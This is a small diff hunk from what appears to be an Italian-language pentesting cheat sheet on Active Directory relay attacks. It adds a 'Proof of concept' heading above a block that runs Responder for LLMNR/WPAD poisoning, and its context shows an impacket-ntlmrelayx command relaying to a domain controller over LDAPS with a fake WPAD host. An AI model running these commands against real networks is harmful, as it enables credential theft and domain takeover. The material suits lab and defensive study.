@@ -97,6 +97,8 @@ impacket-ntlmrelayx -6 -t ldaps://<DC-IP> -wh fakewpad.adlab.com -l loot
 
 ➤ ms-DS-MachineAccountQuota ha bisogno di essere almeno a 1 (10 by default)
 
+#### Proof of concept
+
 ```
 # On first terminal
 sudo ./Responder.py -I eth0 -wfrd -P -v
